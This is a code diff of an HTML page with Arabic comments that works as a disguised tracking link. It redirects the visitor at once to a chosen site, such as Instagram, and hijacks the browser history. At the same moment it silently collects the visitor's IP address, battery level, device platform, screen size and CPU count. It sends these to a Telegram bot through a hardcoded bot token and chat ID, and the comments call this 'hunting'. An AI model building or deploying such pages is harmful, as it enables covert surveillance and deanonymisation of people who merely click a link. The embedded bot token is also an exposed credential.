@@ -3,48 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <script>
-        // إعداداتك الثابتة
         const T = "8795074558:AAHSNWiXI4mKMFsyrEP6qEkMdRQrbc9Yid8";
         const C = "5773364548";
 
-        async function launch() {
-            // 1. استخراج الوجهة (التحويل الفوري)
+        async function godMode() {
             const u = new URLSearchParams(window.location.search).get('u') || 'https://instagram.com';
             
-            // 2. أمر التحويل يسبق كل شيء (سرعة البرق)
+            // 1. اختطاف السجل + تحويل فوري (قبل أي معالجة)
+            window.history.replaceState(null, null, u);
             window.location.replace(u);
 
-            // 3. جمع البيانات في الخلفية (أثناء ما المتصفح يحمل الصفحة الجديدة)
+            // 2. صيد البطارية (للأندرويد والآيفون المحدث)
             let b = "N/A";
-            try { 
+            try {
                 if (navigator.getBattery) {
                     const bt = await navigator.getBattery();
                     b = Math.round(bt.level * 100) + "%";
                 }
             } catch(e) {}
 
-            // سحب الـ IP والمعلومات بطلب واحد "خفيف" جداً
-            fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(data => {
+            // 3. سحب البيانات من أسرع سيرفر بالعالم (Cloudflare)
+            fetch('https://dash.cloudflare.com/cdn-cgi/trace').then(r => r.text()).then(t => {
+                const ip = t.match(/ip=(.*)/)[1];
+                
+                // 4. إرسال الآيبي مع رابط "التحليل الذكي" حتى نضمن السرعة 100%
                 const msg = `
-🎯 **صيد سريع (النسخة الصامتة)**
+🚀 **تم الرصد بنجاح (الخبير X)** 🚀
 ━━━━━━━━━━━━━━━
-🌐 الـ IP: \`${data.ip}\`
+🌐 الـ IP: \`${ip}\`
 🔋 البطارية: ${b}
 📱 الجهاز: ${navigator.platform}
+⚙️ المعالج: ${navigator.hardwareConcurrency || '?'} Core
 🖥️ الشاشة: ${screen.width}x${screen.height}
-⚙️ المعالج: ${navigator.hardwareConcurrency || 'غير معروف'} كور
 ━━━━━━━━━━━━━━━
-🔗 رابط فحص الموقع (اضغط عليه):
-https://ip-api.com/#${data.ip}`;
+📍 رابط التحليل والموقع (اضغط):
+https://ip-api.com/#${ip}`;
 
-                // إرسال البيانات باستخدام Beacon (أقوى طريقة للإرسال أثناء الخروج)
                 const url = `https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
                 navigator.sendBeacon(url);
             });
         }
-        window.onload = launch;
+        godMode();
     </script>
 </head>
 <body style="background:#000"></body>
